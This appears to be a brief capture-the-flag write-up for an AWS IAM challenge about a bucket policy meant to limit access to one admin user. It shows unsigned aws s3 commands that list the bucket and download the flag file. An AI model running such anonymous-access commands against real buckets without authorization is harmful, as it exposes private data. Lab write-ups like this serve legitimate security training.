# Challenge 4

## Task
Admin only?
We learned from our mistakes from the past. Now our bucket only allows access to one specific admin user. Or does it?

------

1. Again we are given with Iam AssumeRole
2. Again another Resource Policy

<img width="1290" height="1031" alt="image" src="https://github.com/user-attachments/assets/f71e1843-3529-4577-abb5-ee8e180a62d1" />

------

Lets' try to list files:
```bash
$ aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request
```

<img width="2800" height="506" alt="image" src="https://github.com/user-attachments/assets/27418496-db92-48cf-b990-11883a85d875" />

```bash
$ aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt /tmp/ --no-sign-request
```

<img width="2800" height="482" alt="image" src="https://github.com/user-attachments/assets/5cb069fc-5870-4e46-9ce0-51ee408ca5a5" />

> Flag
